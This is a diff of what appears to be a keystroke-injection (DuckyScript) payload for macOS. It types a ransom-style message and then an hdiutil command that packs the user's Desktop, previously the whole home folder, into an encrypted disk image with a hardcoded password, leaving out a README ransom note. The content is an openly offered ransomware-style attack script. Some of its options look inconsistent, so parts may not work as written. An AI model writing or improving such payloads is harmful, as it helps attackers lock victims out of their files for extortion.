@@ -13,6 +13,6 @@ STRING echo "HERE THE MESSAGE. NOW PLEASE DO THIS: BLA BLA BLA. ONLY WITH THE RI
 DELAY 500
 ENTER
 DELAY 500
-STRING hdiutil create -encryption -stdinpass -srcfolder ~/ -format UDBZ -volname "Encrypted" ~/Desktop/Encrypted.sparsebundle <<< "PASSWORD123"
+STRING hdiutil create -encryption -stdinpass -srcfolder ~/Desktop -format UDBZ -volname "Encrypted" -exclude ~/Desktop/>>>>>>>README<<<<<<<.txt ~/Desktop/Encrypted.sparsebundle <<< "PASSWORD123"
 DELAY 500
 ENTER
